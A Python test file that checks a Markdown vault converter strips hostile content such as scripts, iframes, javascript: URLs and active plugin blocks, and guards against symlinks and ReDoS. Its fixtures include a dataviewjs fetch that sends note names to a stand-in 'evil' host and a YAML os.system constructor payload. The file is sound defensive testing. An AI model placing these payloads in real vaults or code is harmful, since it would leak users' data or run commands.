"""
End-to-end security integration tests for the vault converter.

These exercise the full convert() pipeline against crafted
adversarial inputs and verify that:
  • Strict defaults catch every expected pattern (HTML, active
    content, dangerous URLs, frontmatter HTML).
  • Allow flags restore the original content when the user opts in.
  • Symlinks, path traversal, YAML unsafe constructors, VCS
    metadata, and size/count caps don't slip anything through.

Per-module unit tests live in test_sanitize.py, test_active_content.py,
test_scan.py, etc. This file is the integration layer.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest
import yaml

from vault_from_md.convert import ConvertConfig, convert
from vault_from_md.frontmatter import extract
from vault_from_md.scan import scan


def _write(p: Path, content: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")


def _read(p: Path) -> str:
    return p.read_text(encoding="utf-8")


# The adversarial input we use across several tests. Packs every
# attack vector into one note so a single convert() run exercises
# the whole defense surface.
_ADVERSARIAL_BODY = """---
title: Example
description: <script>alert('fm')</script>
---

# Heading

Normal paragraph.

<script>console.log('oops')</script>

<iframe src="https://evil.example.com/frame"></iframe>

<a href="javascript:alert(1)" onclick="alert(2)">click</a>

<img src="data:text/html,<script>x</script>">

[malicious](javascript:alert(1))

```dataview
LIST FROM #private
```

```dataviewjs
dv.pages("#").forEach(p => fetch("http://evil/" + p.file.name))
```

<% tp.system.prompt('exfil') %>

```excalidraw
{"elements": []}
```
"""


class TestStrictDefaults:
    """With no --allow-* flags, every attack pattern is stripped."""

    def test_script_stripped_from_body(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        result = convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "<script>" not in out
        assert "console.log" not in out

    def test_iframe_stripped(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "<iframe" not in out
        assert "evil.example.com" not in out

    def test_event_handlers_stripped(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "onclick" not in out

    def test_dangerous_urls_neutralised(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "javascript:" not in out
        assert "data:text/html" not in out

    def test_markdown_js_link_neutralised(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "[malicious](#)" in out

    def test_active_content_stripped(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        out = _read(dest / "a.md")
        assert "```dataview" not in out
        assert "```dataviewjs" not in out
        assert "```excalidraw" not in out
        assert "<%" not in out

    def test_frontmatter_html_stripped(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest))
        # Parse the converted file's frontmatter and inspect values.
        fm, _ = extract(_read(dest / "a.md"))
        assert "<script>" not in fm.data.get("description", "")

    def test_report_counts_aggregate_correctly(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        result = convert(ConvertConfig(source_root=src, dest_root=dest))
        # Body: at least the script, iframe, the dangerous URLs, the
        # onclick handler, the js markdown link.
        assert result.sanitize_body.elements_stripped >= 2
        assert result.sanitize_body.event_handlers_stripped >= 1
        assert result.sanitize_body.dangerous_urls_neutralised >= 2
        assert result.sanitize_body.markdown_links_neutralised >= 1
        # Active content: dataview + dataviewjs + excalidraw + templater.
        assert result.active_content.dataview == 1
        assert result.active_content.dataviewjs == 1
        assert result.active_content.excalidraw == 1
        assert result.active_content.templater == 1
        # Frontmatter: <script>…</script> = 2 tag strips.
        assert result.sanitize_frontmatter.elements_stripped >= 2


class TestAllowFlagsRestore:
    """With --allow-* flags, the corresponding content passes through."""

    def test_allow_unsafe_html_preserves_script(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(
            source_root=src, dest_root=dest,
            allow_unsafe_html=True,
        ))
        out = _read(dest / "a.md")
        assert "<script>console.log('oops')</script>" in out

    def test_allow_unsafe_html_preserves_js_url(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(
            source_root=src, dest_root=dest,
            allow_unsafe_html=True,
        ))
        out = _read(dest / "a.md")
        assert "javascript:alert" in out

    def test_allow_frontmatter_html_preserves(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(
            source_root=src, dest_root=dest,
            allow_frontmatter_html=True,
        ))
        out = _read(dest / "a.md")
        # Frontmatter description retains its original HTML-ish shape.
        assert "<script>" in out.split("---")[1]  # inside YAML block

    def test_allow_active_content_preserves_dataview(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(
            source_root=src, dest_root=dest,
            allow_active_content=True,
        ))
        out = _read(dest / "a.md")
        assert "```dataview" in out
        assert "```excalidraw" in out

    def test_allow_active_content_still_counts(self, tmp_path: Path) -> None:
        # Counts are produced even when we don't strip — the CLI uses
        # them to tell the user "preserved N dataview blocks."
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        result = convert(ConvertConfig(
            source_root=src, dest_root=dest,
            allow_active_content=True,
        ))
        assert result.active_content.total > 0


class TestYamlSafety:
    """PyYAML safe_load refuses Python-object constructors."""

    def test_python_object_constructor_rejected(self, tmp_path: Path) -> None:
        # `!!python/object:…` would let PyYAML's unsafe loader
        # instantiate arbitrary classes. safe_load refuses — the
        # frontmatter comes back as empty (refused), source preserved.
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "a.md",
            "---\n"
            "evil: !!python/object/apply:os.system ['echo pwnd']\n"
            "---\n"
            "# Body\n"
        )
        # convert() should not execute anything — the file converts
        # (or skips), no subprocess runs.
        result = convert(ConvertConfig(source_root=src, dest_root=dest))
        # We don't care about exact counts here; we care that the
        # process completed without running `os.system`.
        # If safe_load had been unsafe, `os.system('echo pwnd')`
        # would have fired during extract().
        assert result.ok or len(result.markdown_failed) <= 1

    def test_safe_load_used(self) -> None:
        # Regression guard: the frontmatter module must NEVER use
        # yaml.load or yaml.unsafe_load. safe_load only.
        src_path = Path(__file__).resolve().parent.parent / "lib" / "vault_from_md" / "frontmatter.py"
        source = src_path.read_text()
        assert "yaml.safe_load" in source
        assert "yaml.unsafe_load" not in source
        # `yaml.load(` (with opening paren) would be the risky call.
        # `yaml.load` on its own in imports is a namespace reference,
        # not a call, so we check for the call shape.
        assert "yaml.load(" not in source


class TestVcsMetadata:
    """VCS directories (.git, .svn, .hg, .bzr, CVS) don't leak into output."""

    def test_git_metadata_excluded(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / ".git" / "HEAD.md", "gitdir: …")
        _write(src / "note.md", "# Real\n")
        convert(ConvertConfig(source_root=src, dest_root=dest))
        assert not (dest / ".git").exists()
        assert (dest / "note.md").exists()

    def test_svn_metadata_excluded(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / ".svn" / "entries.md", "svn meta")
        _write(src / "note.md", "# Real\n")
        convert(ConvertConfig(source_root=src, dest_root=dest))
        assert not (dest / ".svn").exists()

    def test_cvs_metadata_excluded(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        _write(src / "CVS" / "Entries.md", "cvs meta")
        _write(src / "note.md", "# Real\n")
        convert(ConvertConfig(source_root=src, dest_root=dest))
        assert not (dest / "CVS").exists()


class TestSymlinkSafety:
    """Symlinks in source are never followed, even to dangerous targets."""

    @pytest.mark.skipif(
        os.name == "nt",
        reason="symlink creation requires admin on Windows",
    )
    def test_symlink_to_outside_path_not_followed(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest = tmp_path / "dest"
        outside = tmp_path / "outside"
        src.mkdir()
        outside.mkdir()
        # Plant "secret" content outside the source tree.
        (outside / "secret.md").write_text("# Secret\n\nshould not be read\n")
        # Symlink inside source pointing at the outside file.
        (src / "link.md").symlink_to(outside / "secret.md")
        # Also plant one real file so the convert has something to do.
        (src / "real.md").write_text("# Real\n")
        result = convert(ConvertConfig(source_root=src, dest_root=dest))
        # The symlink was NOT followed — the secret's content never
        # reaches the output vault.
        assert not (dest / "link.md").exists()
        # Real file converted normally.
        assert (dest / "real.md").exists()
        assert "Secret" not in _read(dest / "real.md")


class TestIdempotenceUnderStrict:
    """Strict sanitisation preserves idempotence — re-convert is stable."""

    def test_second_run_byte_identical(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        dest_a = tmp_path / "dest-a"
        dest_b = tmp_path / "dest-b"
        _write(src / "a.md", _ADVERSARIAL_BODY)
        convert(ConvertConfig(source_root=src, dest_root=dest_a))
        convert(ConvertConfig(source_root=src, dest_root=dest_b))
        assert _read(dest_a / "a.md") == _read(dest_b / "a.md")


class TestRedosGuard:
    """Plugin regexes on a pathological input return in bounded time.

    The plugins use non-greedy `.*?` with fixed closing anchors, so
    exponential backtracking shouldn't be possible. This is a
    regression guard — any future pattern that introduces a nested
    quantifier (which we should never do) would show up here as a
    timeout.
    """

    def test_hugo_plugin_bounded_on_pathological_input(self) -> None:
        import time

        from vault_from_md.plugins.hugo import transform

        # 10k unclosed open-markers — the plugin's non-greedy regex
        # will either match nothing or bail out quickly. No shape
        # here should trigger exponential blowup.
        body = "{{< note " * 10_000
        start = time.perf_counter()
        transform(body)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f"hugo.transform took {elapsed:.2f}s on pathological input"

    def test_jekyll_plugin_bounded_on_pathological_input(self) -> None:
        import time

        from vault_from_md.plugins.jekyll import transform

        body = "{% raw " * 10_000
        start = time.perf_counter()
        transform(body)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f"jekyll.transform took {elapsed:.2f}s"

    def test_docusaurus_plugin_bounded_on_pathological_input(self) -> None:
        import time

        from vault_from_md.plugins.docusaurus import transform

        body = ":::warning " * 10_000
        start = time.perf_counter()
        transform(body)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f"docusaurus.transform took {elapsed:.2f}s"

    def test_sanitize_bounded_on_pathological_input(self) -> None:
        import time

        from vault_from_md.sanitize import strip_unsafe_html

        body = "<script " * 10_000
        start = time.perf_counter()
        strip_unsafe_html(body)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f"strip_unsafe_html took {elapsed:.2f}s"
